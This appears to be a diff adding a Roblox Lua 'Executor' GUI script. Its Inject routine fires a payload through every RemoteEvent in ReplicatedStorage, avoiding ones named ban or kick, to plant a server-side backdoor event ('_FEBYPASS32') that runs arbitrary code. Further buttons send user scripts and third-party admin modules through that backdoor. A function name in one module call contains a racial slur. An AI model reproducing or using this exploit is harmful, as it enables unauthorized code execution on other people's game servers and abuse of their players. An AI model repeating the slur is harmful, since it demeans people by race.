@@ -1,0 +1,181 @@
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local TextBox = Instance.new("TextBox")
+local ExecuteButton = Instance.new("TextButton")
+local ClearButton = Instance.new("TextButton")
+local InjectButton = Instance.new("TextButton")
+local ScripthubButton = Instance.new("TextButton")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BackgroundTransparency = 0.4
+MainFrame.Size = UDim2.new(0, 600, 0, 400)
+MainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+
+Title.Parent = MainFrame
+Title.BackgroundTransparency = 1
+Title.Size = UDim2.new(1, 0, 0.1, 0)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Executor"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 24
+Title.Font = Enum.Font.SourceSansBold
+
+TextBox.Parent = MainFrame
+TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.Size = UDim2.new(0.9, 0, 0.5, 0)
+TextBox.Position = UDim2.new(0.05, 0, 0.12, 0)
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.PlaceholderText = "Enter your script here..."
+TextBox.BorderSizePixel = 2
+TextBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.ClearTextOnFocus = false
+TextBox.TextWrapped = true
+TextBox.TextScaled = true
+TextBox.Font = Enum.Font.SourceSans
+
+local function createButton(parent, name, text, position)
+    local button = Instance.new("TextButton")
+    button.Parent = parent
+    button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    button.Size = UDim2.new(0.28, 0, 0.15, 0)
+    button.Position = position
+    button.Text = text
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.BorderSizePixel = 2
+    button.BorderColor3 = Color3.fromRGB(255, 255, 255)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 18
+    return button
+end
+
+ExecuteButton = createButton(MainFrame, "Execute", "Execute", UDim2.new(0.05, 0, 0.7, 0))
+ClearButton = createButton(MainFrame, "Clear", "Clear", UDim2.new(0.36, 0, 0.7, 0))
+InjectButton = createButton(MainFrame, "Inject", "Inject", UDim2.new(0.67, 0, 0.7, 0))
+ScripthubButton = createButton(MainFrame, "Scripthub", "Scripthub", UDim2.new(0.05, 0, 0.85, 0))
+
+local ScripthubFrame = Instance.new("Frame")
+ScripthubFrame.Parent = ScreenGui
+ScripthubFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ScripthubFrame.BackgroundTransparency = 0.4
+ScripthubFrame.Size = UDim2.new(0, 400, 0, 300)
+ScripthubFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
+ScripthubFrame.Visible = false
+ScripthubFrame.Active = true
+ScripthubFrame.Draggable = true
+ScripthubFrame.BorderSizePixel = 2
+ScripthubFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+
+local ScripthubTitle = Instance.new("TextLabel")
+ScripthubTitle.Parent = ScripthubFrame
+ScripthubTitle.BackgroundTransparency = 1
+ScripthubTitle.Size = UDim2.new(1, 0, 0.1, 0)
+ScripthubTitle.Position = UDim2.new(0, 0, 0, 0)
+ScripthubTitle.Text = "Scripthub"
+ScripthubTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScripthubTitle.TextSize = 24
+ScripthubTitle.Font = Enum.Font.SourceSansBold
+
+local QuitosButton = createButton(ScripthubFrame, "Quitos", "Quitos GUI", UDim2.new(0.1, 0, 0.2, 0))
+local PolariaButton = createButton(ScripthubFrame, "Polaria", "Polaria", UDim2.new(0.1, 0, 0.4, 0))
+local H01pKButton = createButton(ScripthubFrame, "H01pK", "H01pK GUI", UDim2.new(0.1, 0, 0.6, 0))
+
+InjectButton.MouseButton1Click:Connect(function()
+    local function b_G_V12(see)
+        local a = function(ree)
+            ree:FireServer([[
+                local folder = Instance.new('RemoteEvent')
+                folder.Name = "_FEBYPASS32"
+                folder.Parent = game:GetService("JointsService")
+                local loadstring = require(13684410229)
+                folder.OnServerEvent:Connect(function(_1,_2)
+                    loadstring(_2)()
+                end)
+            ]])
+        end
+        for i, v in pairs(see:GetChildren()) do
+            if v:IsA("RemoteEvent") then
+                if not string.match(string.lower(v.Name), "ban") then
+                    if not string.match(string.lower(v.Name), "kick") then
+                        a(v)
+                    end
+                end
+            end
+            b_G_V12(v)
+        end
+    end
+    local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+    local timetoken = 0
+    local maxtime = 5
+    repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        InjectButton.Text = "Injected"
+        InjectButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    end
+end)
+
+ExecuteButton.MouseButton1Click:Connect(function()
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        local scriptText = TextBox.Text
+        if scriptText and scriptText ~= "" then
+            local success, err = pcall(function()
+                game:GetService("JointsService")._FEBYPASS32:FireServer(scriptText)
+                print("Script executed successfully!")
+            end)
+            if not success then
+                warn("Execution Error: " .. err)
+            end
+        else
+            warn("Script is empty!")
+        end
+    else
+        warn("_FEBYPASS32 not found. Please inject first.")
+    end
+end)
+
+ClearButton.MouseButton1Click:Connect(function()
+    TextBox.Text = ""
+end)
+
+ScripthubButton.MouseButton1Click:Connect(function()
+    ScripthubFrame.Visible = not ScripthubFrame.Visible
+end)
+
+QuitosButton.MouseButton1Click:Connect(function()
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        local script = 'require(136199913883937):Pload("' .. game.Players.LocalPlayer.Name .. '")'
+        game:GetService("JointsService")._FEBYPASS32:FireServer(script)
+        print("Quitos GUI loaded for " .. game.Players.LocalPlayer.Name)
+    else
+        warn("_FEBYPASS32 not found. Please inject first.")
+    end
+end)
+
+PolariaButton.MouseButton1Click:Connect(function()
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        local script = 'require(123255432303221):Pload("' .. game.Players.LocalPlayer.Name .. '")'
+        game:GetService("JointsService")._FEBYPASS32:FireServer(script)
+        print("Polaria loaded for " .. game.Players.LocalPlayer.Name)
+    else
+        warn("_FEBYPASS32 not found. Please inject first.")
+    end
+end)
+
+H01pKButton.MouseButton1Click:Connect(function()
+    if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+        local script = 'require(0x4af2144545ce).ALLNIGGAITISKINGV44LEAKKKkh01pkOnTOP("' .. game.Players.LocalPlayer.Name .. '")'
+        game:GetService("JointsService")._FEBYPASS32:FireServer(script)
+        print("H01pK GUI loaded for " .. game.Players.LocalPlayer.Name)
+    else
+        warn("_FEBYPASS32 not found. Please inject first.")
+    end
+end)
